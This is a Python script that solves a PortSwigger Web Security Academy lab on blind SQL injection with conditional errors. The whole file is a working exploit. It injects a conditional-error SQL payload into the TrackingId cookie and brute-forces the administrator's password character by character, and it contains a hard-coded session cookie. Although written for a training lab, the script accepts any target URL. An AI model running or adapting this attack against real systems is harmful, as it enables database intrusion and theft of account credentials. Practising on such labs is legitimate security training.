# Lab12 from portswigger: Blind SQL injection with conditional errors.

import requests
import sys
from termcolor import colored

# You can change and set the headers of your request.
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://0aef00dc04bfcd7fc0e16319004d00cc.web-security-academy.net/", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Te": "trailers", "Connection": "close"}

proxy = {"http" : "http://127.0.0.1:8080"}

admin_password=[]
def retrieve_password(url):
    for number in range(1,21): # Test each char position for the passoword(the password length is 20 char).
        for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
            payload =f"'||(SELECT CASE WHEN ASCII(SUBSTR(password,{number},1))={ascii_char} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--"
            
            # This is another payload using the 'WHERE' keyword.
            #payload =f"'||(SELECT TO_CHAR(1/0) FROM users WHERE ASCII(SUBSTR(password,{number},1))={ascii_char} AND username='administrator')--" 
            
            cookies={ # You must change it and set the cookies of your request.
                "TrackingId": "YkSwHFRFicSRKULO" + payload 
                , "session": "LSbZa0aO4BfYPfckjvBc2SOG2p1dExVB"}
            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxy)
            if ("Internal Server Error") in response.text:
                print(colored(f"\n\n[+] Correct letter: {chr(ascii_char)}\n\n", "green"))
                admin_password.append(chr(ascii_char))
                break
            else:
                print(colored(cookies["TrackingId"],"red"))
    password=''.join(admin_password)
    print(colored(f"Admin password: {password}","cyan"))
       

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        print(f"[+] Example usage: {sys.argv[0]} \"example.com\"")
    else:
        url = sys.argv[1]
        retrieve_password(url)    

        
if __name__ == '__main__':
    main()
